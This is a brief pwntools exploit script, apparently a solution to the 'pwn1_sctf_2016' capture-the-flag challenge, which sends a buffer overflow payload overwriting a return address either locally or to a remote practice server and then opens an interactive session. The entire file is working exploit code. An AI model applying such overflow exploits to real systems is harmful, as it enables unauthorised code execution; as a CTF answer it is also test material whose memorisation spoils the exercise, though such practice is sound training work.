import sys
from pwn import *
context.log_level='debug'
#context.arch='amd64'

if len(sys.argv)==1 :
	io=process('pwn1_sctf_2016')
	elf=ELF('pwn1_sctf_2016')
	#libc=ELF('')
else :
	io=remote('node3.buuoj.cn',28537)
	elf=ELF('pwn1_sctf_2016')
	#libc=ELF('')


#io.recv()
pay='I'*0x15+'a'+p32(0x08048f0d)
io.sendline(pay)
io.recv()
#gdb.attach(io)
#pause()
io.interactive()